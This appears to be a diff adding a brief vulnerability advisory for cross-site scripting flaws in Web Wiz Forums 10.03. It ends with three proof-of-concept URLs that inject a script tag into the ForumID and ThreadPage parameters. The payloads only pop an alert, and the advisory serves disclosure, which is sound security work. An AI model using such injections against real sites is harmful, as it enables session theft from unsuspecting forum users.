@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/55220/info
+
+Web Wiz Forums is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Web Wiz Forums 10.03 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/forum_members.asp?find=S&ForumID=%22%3E%3Cscript%3Ealert(0);%3C/script%3E
+
+http://www.example.com/forum_members.asp?find=S&ForumID=%22%3E%3Cscript%3Ealert(0);%3C/script%3E
+
+http://www.www.example.com/post_message_form.asp?ForumID=63&mode=new&PagePosition=0&ReturnPage=Thread&ThreadPage="><script>alert(0);</script>&TopicID=57676 
